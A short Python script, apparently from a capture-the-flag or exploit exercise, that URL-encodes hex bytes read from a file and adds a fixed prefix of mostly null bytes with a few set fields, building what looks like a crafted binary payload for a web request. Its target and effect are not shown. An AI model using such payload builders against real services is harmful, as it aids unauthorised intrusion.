#!/usr/bin/env python

exp = ""

pre = "%00%00%00%2d%00%00%00%00%00%00%00%00%00%00%00%00%00%00%75%30%00%00%00%00%00%00%00%00%00%00%00%10%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00"

with open("1", "r") as f:
	x = f.read().split(" ")
	for i in x:
		exp = exp + "%" + i

print(pre + exp)